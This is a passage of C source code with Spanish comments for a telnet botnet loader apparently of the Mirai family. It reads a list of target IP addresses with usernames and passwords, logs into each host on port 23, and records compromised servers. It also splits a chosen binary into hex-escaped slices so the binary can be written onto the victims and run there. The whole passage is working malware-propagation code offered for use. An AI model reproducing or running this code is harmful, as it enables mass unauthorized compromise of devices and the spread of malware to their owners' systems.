                        /* Verificar fin de datos de entorno o prompt */
                        if (memmem(buf, got, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) != NULL || 
                            matchPrompt(buf))
                        {
                            /* Configurar prompt personalizado */
                            sockprintf(state->fd, "export PS1=\"prompt>\"\r\n");
                            state->state = 8;
                            break;
                        }
                    }
                }
                
                /* Estado 254: Reconexión por fallo */
                if (state->state == 254)
                {
                    /* Limpiar y cerrar conexión para reintentar */
                    closeAndCleanup(state->fd); 
                    is_closed = 1;
                }
                
                /* Estado 255: Finalización */
                if (state->state == 255)
                {
                    if (state->success)
                    {
                        /* Registrar servidor comprometido */
                        handle_found(state->fd);
                    }
                    /* Limpiar y cerrar conexión */
                    closeAndCleanup(state->fd); 
                    is_closed = 1;
                }
                
                /* Actualizar timestamp si el estado cambió o estamos cargando binario */
                if (state->slotUsed && (old_state != state->state || state->state == 101))
                    updateAccessTime(state->fd);
                
                /* Liberar mutex */
                pthread_mutex_unlock(&state->mutex);
                
                /* Reconfigurar epoll si la conexión sigue activa */
                if (!is_closed)
                {
                    struct epoll_event event = {0};
                    event.data.fd = state->fd;
                    event.events = EPOLLIN | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;
                    epoll_ctl(epollFD, EPOLL_CTL_MOD, state->fd, &event);
                }
            } 
            /* Manejar eventos de escritura */
            else if(pevents[i].events & EPOLLOUT)
            {   
                struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
                
                /* Proteger acceso al estado */
                pthread_mutex_lock(&state->mutex);
                
                /* Manejar estado inicial de conexión */
                if(state->state == 0)
                {
                    /* Verificar error de conexión */
                    int so_error = 0;
                    socklen_t len = sizeof(so_error);
                    getsockopt(state->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
                    
                    /* Si hay error, manejar fallo y limpiar */
                    if (so_error) {  
                        handle_failed_connect(state->fd); 
                        closeAndCleanup(state->fd); 
                        pthread_mutex_unlock(&state->mutex); 
                        continue; 
                    }
                    
                    /* Conexión exitosa, avanzar al siguiente estado */
                    state->state = 1;
                    
                    /* Reconfigurar epoll para lectura */
                    pevents[i].events = EPOLLIN | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;
                    epoll_ctl(epollFD, EPOLL_CTL_MOD, state->fd, &pevents[i]);
                } 
                /* Estado inválido para evento de escritura */
                else {
                    printf("estado incorrecto en epoll de conexión: %d\n", state->fd);
                    closeAndCleanup(state->fd);
                }
                
                /* Liberar mutex */
                pthread_mutex_unlock(&state->mutex);
            }
        }
    }

    /* Decrementar contador de hilos activos */
    __sync_fetch_and_sub(&running_threads, 1);

    return NULL;
}

/**
 * Manejador de señal SIGINT (Interrupción de Teclado)
 * 
 * Esta función procesa la señal SIGINT generada típicamente
 * por la combinación Ctrl+C, permitiendo una terminación
 * limpia del programa.
 * 
 * Acciones:
 * 1. Imprime mensaje de notificación
 * 2. Termina el programa con estado 0 (éxito)
 * 
 * @param sig  Número de señal SIGINT recibida
 */
void sighandler(int sig)
{
    printf("\nInterrupción detectada (Ctrl+C)\n");
    exit(0);  /* Terminación limpia */
}

/**
 * Función de Limpieza de Strings (Chomp)
 * 
 * Elimina caracteres de nueva línea (\n, \r) del final
 * de un string, similar a la función chomp de Perl.
 * 
 * Proceso:
 * 1. Busca el primer \n o \r en el string
 * 2. Reemplaza con terminador nulo
 * 
 * @param s  Puntero al string a limpiar (modificado in-place)
 */
void chomp(char *s)
{
    /* Avanzar hasta encontrar \n o \r */
    while(*s && *s != '\n' && *s != '\r') s++;
    *s = 0;  /* Terminar string en el primer \n o \r */
}

/**
 * Hilo Principal de Carga y Gestión de Conexiones
 * 
 * Este es el hilo principal que:
 * 1. Lee objetivos del archivo de entrada
 * 2. Establece conexiones TCP
 * 3. Configura y monitorea estados de conexión
 * 4. Maneja reconexiones y timeouts
 * 5. Coordina con hilos de inundación
 * 
 * Características:
 * - Lectura línea por línea del archivo de objetivos
 * - Configuración de sockets no bloqueantes
 * - Control de límite de conexiones simultáneas
 * - Gestión de timeouts y reconexiones
 * - Sincronización con epoll y otros hilos
 * 
 * @param threadCount  Número de hilos de inundación (no usado)
 * @return            NULL al finalizar
 */
void *loader(void *threadCount)
{
    /* Buffer para lectura de archivo */
    char readmelolfgt[1024], *hahgay;
    memset(readmelolfgt, 0, 1024);

    /* Variables para procesamiento de líneas */
    char *pch = NULL;
    char *running, *orig, *token;
    /* Procesar cada línea del archivo de entrada */
    while(fgets(readmelolfgt, 1024, infd) != NULL)
    {
        /* Esperar si alcanzamos el límite de conexiones */
        while(getConnectedSockets() > (maxConnectedSockets - 1))
        {
            int curTime = time(NULL);
            int q;
            
            /* Buscar y limpiar conexiones timeout */
            for(q = 0; q < maxFDSaw; q++)
            {
                pthread_mutex_lock(&stateTable[q].mutex);
                /* Verificar timeout (60 segundos) y no reconectando */
                if(stateTable[q].slotUsed && 
                   curTime > (stateTable[q].updatedAt + 60) && 
                   stateTable[q].reconnecting == 0)
                {
                    /* Manejar tipo de error */
                    if (stateTable[q].state == 0) 
                        handle_failed_connect(stateTable[q].fd);
                    else 
                        handle_timeout(stateTable[q].fd);
                    
                    /* Limpiar conexión */
                    closeAndCleanup(stateTable[q].fd);
                }
                pthread_mutex_unlock(&stateTable[q].mutex);
            }

            /* Esperar 1 segundo antes de siguiente verificación */
            usleep(1000000);
        }
        
        /* Duplicar línea para procesamiento */
        running = orig = strdup(readmelolfgt);

        /* Extraer IP del objetivo */
        token = strsep(&running, ":");
        if(token == NULL || inet_addr(token) == -1) { 
            free(orig); 
            continue; 
        }
        
        /* Preparar estructura de dirección */
        struct sockaddr_in dest_addr = {0};
        memset(&dest_addr, 0, sizeof(struct sockaddr_in));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);            /* Puerto Telnet */
        dest_addr.sin_addr.s_addr = inet_addr(token);
        
        /* Variables para socket */
        int fd = 0;
        struct sockaddr_in my_addr = {0};

        /* Intentar crear y configurar socket */
        do
        {
            /* Cerrar socket previo si existe */
            if (errno != EBADF && fd > 0)
                close(fd);
            
            fd = 0;

            /* Crear nuevo socket TCP */
            if((fd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))<0)
            {
                perror("Error al crear socket");
                exit(-1);
            }
            
            /* Configurar socket como no bloqueante */
            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, NULL) | O_NONBLOCK);
            
            /* Deshabilitar algoritmo de Nagle */
            int flag = 1; 
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(int));

            /* Configurar dirección local */
            memset(&my_addr, 0, sizeof(struct sockaddr_in));
            my_addr.sin_addr.s_addr = inet_addr(bind_ip);
            my_addr.sin_port = htons(port++);      /* Incrementar puerto */
            my_addr.sin_family = AF_INET;
            errno = 0;
            
        /* Reintentar bind hasta tener éxito */
        } while(bind(fd, (struct sockaddr *)&my_addr, sizeof(my_addr)) != 0);

        printf("Socket vinculado\n");

        int res = 0;
        res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if(res < 0 && errno != EINPROGRESS) { close(fd); continue; }

        if(fd > maxFDSaw) maxFDSaw = fd + 1;

        pthread_mutex_lock(&stateTable[fd].mutex);
        if(!stateTable[fd].slotUsed)
        {

            printf("memes\n");
            stateTable[fd].fd = fd;
            stateTable[fd].updatedAt = time(NULL);
            stateTable[fd].slotUsed = 1;
            stateTable[fd].state = 0;
            stateTable[fd].is_open = 1;
            stateTable[fd].special = 0;
            
            token = strsep(&running, ":");
            strcpy(stateTable[fd].username, token);
            
            token = strsep(&running, ":");
            strcpy(stateTable[fd].password, token);
        } else {
            printf("used slot found in loader thread?\n");
        }
        pthread_mutex_unlock(&stateTable[fd].mutex);

        struct epoll_event event = {0};
        event.data.fd = fd;
        event.events = EPOLLOUT | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;
        epoll_ctl(epollFD, EPOLL_CTL_ADD, fd, &event);
        
        free(orig);
    }
    
    printf("done reading input file.\n");

    while(1)
    {
        int curTime = time(NULL);
        int q;
        for(q = 0; q < maxFDSaw; q++)
        {
            pthread_mutex_lock(&stateTable[q].mutex);
            if(stateTable[q].slotUsed && curTime > (stateTable[q].updatedAt + 60) && stateTable[q].reconnecting == 0)
            {
                if (stateTable[q].state == 0) handle_failed_connect(stateTable[q].fd);
                else handle_timeout(stateTable[q].fd);
                
                closeAndCleanup(stateTable[q].fd);
            }
            pthread_mutex_unlock(&stateTable[q].mutex);
        }

        sleep(1);
    }

    close(epollFD);
}

/**
 * Carga y Procesa Archivo Binario para Transferencia
 * 
 * Esta función lee un archivo binario y lo prepara para su transferencia
 * dividiéndolo en slices (segmentos) que pueden ser enviados por
 * conexiones Telnet de manera segura.
 *
 * Proceso:
 * 1. Obtiene tamaño del archivo
 * 2. Calcula número de slices necesarios
 * 3. Asigna memoria para estructuras de datos
 * 4. Convierte bytes a formato hexadecimal escapado
 *
 * Notas técnicas:
 * - Usa /proc/self/exe para acceso al binario
 * - Divide el archivo en bloques de BYTES_PER_LINE
 * - Convierte cada byte a formato \xXX
 * - Mantiene límite de caracteres por línea
 *
 * @param path  Ruta del archivo binario a cargar
 * @return      0 en éxito, -1 en error
 */
int load_binary(char *path)
{
    /* Nota: /proc/self/exe funciona incluso si el binario es eliminado */
    int fd;                  /* Descriptor de archivo */
    int size = 0;           /* Tamaño del archivo */
    int got = 0;            /* Bytes leídos */
    int i;                  /* Índice para bucles */
    int slice = 0;          /* Índice de slice actual */
    unsigned char ch;       /* Buffer para lectura byte a byte */
    
    /* Primera pasada: obtener tamaño del archivo */
    if ((fd = open(path, O_RDONLY)) == -1)
        return -1;
    while ((got = read(fd, &ch, 1)) > 0) size++;
    close(fd);
    
    /* Calcular número de slices necesarios */
    binary.num_slices = ceil(size / (float)BYTES_PER_LINE);
    
    /* Asignar memoria para array de slices */
    binary.slices = calloc(binary.num_slices, sizeof(unsigned char *));
    if (binary.slices == NULL)
        return -1;
        
    /* Asignar memoria para cada slice individual */
    for (i = 0; i < binary.num_slices; i++)
    {
        binary.slices[i] = calloc(1, MAX_SLICE_LENGTH + 1);
        if (binary.slices[i] == NULL)
            return -1;
    }
    
    if ((fd = open(path, O_RDONLY)) == -1)
        return -1;
    do
    {
        for (i = 0; i < BYTES_PER_LINE; i++)
        {
            got = read(fd, &ch, 1);
            if (got != 1) break;
            
            sprintf(binary.slices[slice] + strlen(binary.slices[slice]), "\\\\x%02X", ch);
        }
        
        slice++;
    } while(got > 0);
    close(fd);
    
    return 0;
}

/**
 * Función Principal del Programa
 * 
 * Inicializa y configura el sistema de carga y distribución de binarios,
 * incluyendo:
 * 1. Validación de parámetros de línea de comandos
 * 2. Configuración de señales y descriptores
 * 3. Inicialización de hilos y recursos
 * 4. Monitoreo y reporte de estado
 *
 * Parámetros esperados:
 * - bind_ip: IP para vincular conexiones salientes
 * - input_file: Archivo con lista de objetivos
 * - file_to_load: Binario a cargar en objetivos
 * - argument: Argumentos para ejecutar el binario
 * - threads: Número de hilos de carga
 * - connections: Límite de conexiones simultáneas
 * - [debug_mode]: Opcional, activa logging detallado
 *
 * @param argc  Número de argumentos
 * @param argv  Array de argumentos
 * @return      0 en éxito, -1 en error
 */
int main(int argc, char *argv[ ])
{
    /* Validar número mínimo de argumentos */
    if(argc < 4){
        fprintf(stderr, "¡Parámetros inválidos!\n");
        fprintf(stdout, "Uso: %s <IP_bind> <archivo_entrada> <archivo_a_cargar> <argumentos> <hilos> <conexiones> (modo_debug)\n", argv[0]);
        exit(-1);
    }
    
    /* Ignorar señales de pipe roto */
    signal(SIGPIPE, SIG_IGN);
    
    /* Crear descriptor epoll con identificador mágico */
    epollFD = epoll_create(0xDEAD);
    
    /* Configurar parámetros principales */
    bind_ip = argv[1];                      /* IP para bind */
    infd = fopen(argv[2], "r");            /* Archivo de entrada */
    signal(SIGINT, &sighandler);           /* Manejador Ctrl+C */
    int threads = atoi(argv[5]);           /* Número de hilos */
    maxConnectedSockets = atoi(argv[6]);    /* Límite de conexiones */
    
    /* Activar modo debug si se especifica */
    if (argc == 8)
        debug_mode = 1;
    
    int i;
    for(i = 0; i < (1024 * 100); i++)
    {
        pthread_mutex_init(&stateTable[i].mutex, NULL);
    }

    load_binary(argv[3]);
    run_arg = argv[4];

    pthread_t thread;
    pthread_create( &thread, NULL, &loader, (void *) &threads);

    for(i = 0; i < threads; i++) pthread_create( &thread, NULL, &flood, (void *) NULL);

    char timeText[100];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);

    printf("Starting Scan at %s\n", timeText);
    char temp[17] = {0};
    memset(temp, 0, 17);
    sprintf(temp, "Loaded");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "State Timeout");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "No Connect");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Closed Us");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Logins Tried");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "B/s");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Connected");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Running Thrds");
    printf("%s", temp);
    printf("\n");

    sleep(1);

    char *new;
    new = (char *)malloc(16*6);
    while (debug_mode ? 1 : running_threads > 0)
    {
        printf("\r");
        memset(new, '\0', 16*6);
        sprintf(new, "%s|%-15lu", new, found_srvs);
        sprintf(new, "%s|%-15lu", new, timed_out);
        sprintf(new, "%s|%-15lu", new, failed_connect);
        sprintf(new, "%s|%-15lu", new, remote_hangup);
        sprintf(new, "%s|%-15lu", new, login_done);
        sprintf(new, "%s|%-15d", new, bytes_sent);
        sprintf(new, "%s|%-15lu", new, getConnectedSockets());
        sprintf(new, "%s|%-15d", new, running_threads);
        printf("%s", new);
        fflush(stdout);
        bytes_sent=0;
        sleep(1);
    }
    printf("\n");

    now = time(NULL);
    t = localtime(&now);
    strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);
    printf("Scan finished at %s\n", timeText);
    return 0;
}